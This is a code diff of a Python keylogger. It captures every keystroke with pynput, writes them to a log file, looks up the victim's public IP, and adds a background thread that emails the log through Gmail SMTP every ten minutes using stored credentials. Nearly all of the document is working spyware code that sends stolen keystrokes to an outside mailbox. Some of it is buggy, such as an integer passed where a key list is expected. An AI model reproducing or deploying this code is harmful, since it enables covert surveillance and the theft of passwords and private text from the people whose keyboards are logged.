@@ -16,11 +16,14 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+
 import config
+import threading
 
 from pynput.keyboard import Key, Listener
 
 count = 0
+cout = 0
 keys = []
 
 publicIP = requests.get('https://api.ipify.org').text
@@ -56,32 +59,37 @@ def on_press(key):
     count += 1
     print("{0} pressed".format(key))
     
-    if count >= 5:
-        count = 0
+    if count >= 15:
         write_file(keys)
         keys = []
 
 def write_file(keys):
+    global cout
+    
     with open("log.txt", "a") as f:
         for key in keys:
             k = str(key).replace("\'","")
             
-            if k.find("space") > 0:
-                f.write('\n')
+            if cout > 10:
+                k = k + ' \n'
+                f.write(k)
+                cout = 0
             elif k.find("Key") == -1:
                 f.write(k)
+                cout += 1
 
 def on_release(key):
     if key == Key.esc:
         return False
 
+
 def send_logs():
     count = 0
-    
+ 
     fromAddr = config.fromAddr
     fromPswd = config.fromPswd
     toAddr = fromAddr
-    
+ 
     MIN = 10
     SECONDS = 60
     time.sleep(MIN * SECONDS) # every 10 mins write file/send log
@@ -89,42 +97,50 @@ def send_logs():
         if len(keys) > 1:
             try:
                 write_file(count)
-                subject = f'[{user}] ~ {count}'
                 
+                subject = f'[{user}] ~ {count}'            
                 msg = MIMEMultipart()
                 msg['From'] = fromAddr
                 msg['To'] = toAddr
                 msg['Subject'] = subject
                 body = 'testing'
-                
+ 
                 #in same directory as script
                 filename = "log.txt" 
-                
+    
                 msg.attach(MIMEText(body, "plain"))
                 with open(filename, "rb") as attachment:
                     part = MIMEBase("application", "octet-stream")
                     part.set_payload(attachment.read())
                     
-                encoders.encode_base64(part)
-                part.add_header('content-disposition','attachment;filename=' + str(filename))
-                msg.attach(part)
-                text = msg.as_string()
+                    encoders.encode_base64(part)
+                    part.add_header('content-disposition','attachment;filename=' + str(filename))
+                    msg.attach(part)
+                    text = msg.as_string()
+                    
+                    s = smtplib.SMTP('smtp.gmail.com', 587)
+                    s.ehlo()
+                    s.starttls()
+                    print('starttls')
+                    
+                    s.ehlo()
+                    s.login(fromAddr,fromPswd)
+                    s.sendmail(fromAddr,toAddr,text)
+                    print('sent mail')
+                    
+                    attachment.close()
+                    s.close()
+                    
+                    count += 1
                 
-                s = smtplib.SMTP('smtp.gmail.com', 587)
-                s.ehlo()
-                s.starttls()
-                print('starttls')
-                
-                s.ehlo()
-                s.login(fromAddr,fromPswd)
-                s.sendmail(fromAddr,toAddr,text)
-                print('sent mail')
-                
-                attachment.close()
-                s.close()
-                
-                count += 1
+            except Exception as err:
+                print (err)
+                pass
 
-with Listener(on_press = on_press, on_release = on_release) as listener:
-    listener.join()
+if __name__ == '__main__':
+    T1 = threading.Thread(target = send_logs)
+    T1. start(
+            )
+    with Listener(on_press = on_press, on_release = on_release) as listener:
+        listener.join()
 
